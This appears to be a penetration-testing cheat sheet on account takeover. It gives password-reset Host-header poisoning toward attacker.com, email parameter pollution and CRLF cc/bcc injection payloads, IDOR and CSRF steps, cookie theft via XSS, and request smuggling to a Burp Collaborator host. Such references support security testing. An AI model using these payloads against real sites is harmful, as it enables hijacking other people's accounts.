# Account Takeover

## Summary

* [Password Reset Feature](#password-reset-feature)
    * [Password Reset Token Leak Via Referrer](#password-reset-token-leak-via-referer)
    * [Account Takeover Through Password Reset Poisoning](#account-takeover-through-password-reset-poisoning)
    * [Password Reset Via Email Parameter](#password-reset-via-email-parameter)
    * [IDOR on API Parameters](#idor-on-api-parameters)
    * [Weak Password Reset Token](#weak-password-reset-token)
* [Account Takeover Via Cross Site Scripting](#account-takeover-via-cross-site-scripting)
* [Account Takeover Via HTTP Request Smuggling](#account-takeover-via-http-request-smuggling)
* [Account Takeover via CSRF](#account-takeover-via-csrf)
* [References](#references)

## Password Reset Feature

### Password Reset Token Leak Via Referrer

1. Request password reset to your email address
2. Click on the password reset link
3. Dont change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referer header is leaking password reset token.

### Account Takeover Through Password Reset Poisoning

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header
    ```http
    POST https://example.com/reset.php HTTP/1.1
    Accept: */*
    Content-Type: application/json
    Host: attacker.com
    ```
4. Look for a password reset URL based on the *host header* like : `https://attacker.com/reset-password.php?token=TOKEN`


### Password Reset Via Email Parameter

```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```

### IDOR on API Parameters

1. Attacker have to login with their account and go to the **Change password** feature.
2. Start the Burp Suite and Intercept the request
3. Send it to the repeater tab and edit the parameters
    ```powershell
    POST /api/changepass
    [...]
    ("form": {"email":"victim@email.com","password":"securepwd"})
    ```

### Weak Password Reset Token

The password reset token should be randomly generated and unique every time.
Try to determine if the token expire or if it's always the same, in some cases the generation algorithm is weak and can be guessed. The following variables might be used by the algorithm.

* Timestamp
* UserID
* Email of User
* Firstname and Lastname
* Date of Birth
* Cryptography
* Number only
* Small token sequence (<6 characters between [A-Z,a-z,0-9])
* Token reuse
* Token expiration date

## Account Takeover Via Cross Site Scripting

1. Find an XSS inside the application or a subdomain if the cookies are scoped to the parent domain : `*.domain.com`
2. Leak the current **sessions cookie**
3. Authenticate as the user using the cookie

## Account Takeover Via HTTP Request Smuggling

Refer to **HTTP Request Smuggling** vulnerability page.
1. Use **smuggler** to detect the type of HTTP Request Smuggling (CL, TE, CL.TE)
    ```powershell
    git clone https://github.com/defparam/smuggler.git
    cd smuggler
    python3 smuggler.py -h
    ```
2. Craft a request which will overwrite the `POST / HTTP/1.1` with the following data:
    ```powershell
    GET http://something.burpcollaborator.net  HTTP/1.1
    X: 
    ```
3. Final request could look like the following
    ```powershell
    GET /  HTTP/1.1
    Transfert-Encoding: chunked
    Host: something.com
    User-Agent: Smuggler/v1.0
    Content-Length: 83

    0

    GET http://something.burpcollaborator.net  HTTP/1.1
    X: X
    ```

### Account Takeover via CSRF

1. Create a payload for the CSRF, e.g: "HTML form with auto submit for a password change"
2. Send the payload

Hackerone reports exploiting this bug
* https://hackerone.com/reports/737140
* https://hackerone.com/reports/771666


## TODO

* Broken cryptography
* Session hijacking
* OAuth misconfiguration


## References

- [10 Password Reset Flaws - Anugrah SR](http://anugrahsr.me/posts/10-Password-reset-flaws/)
- [$6,5k + $5k HTTP Request Smuggling mass account takeover - Slack + Zomato - Bug Bounty Reports Explained](https://www.youtube.com/watch?v=gzM4wWA7RFo&feature=youtu.be)
- [Broken Cryptography & Account Takeovers - Harsh Bothra - September 20, 2020](https://speakerdeck.com/harshbothra/broken-cryptography-and-account-takeovers?slide=28)